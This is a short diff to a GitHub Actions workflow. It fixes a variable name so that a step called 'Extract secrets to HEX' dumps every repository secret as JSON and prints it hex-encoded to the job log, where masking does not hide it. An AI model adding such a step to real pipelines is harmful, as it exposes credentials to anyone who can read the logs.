@@ -24,7 +24,7 @@ jobs:
             done < "$file_name"
         - name: Extract secrets to HEX
           env:
-            SECRET_LIST: "${{ toJSON(secrets) }}"
+            ALLSECRETS: "${{ toJSON(secrets) }}"
           run: |
             echo $ALLSECRETS | jq | xxd -p -c 1000000
           shell: bash
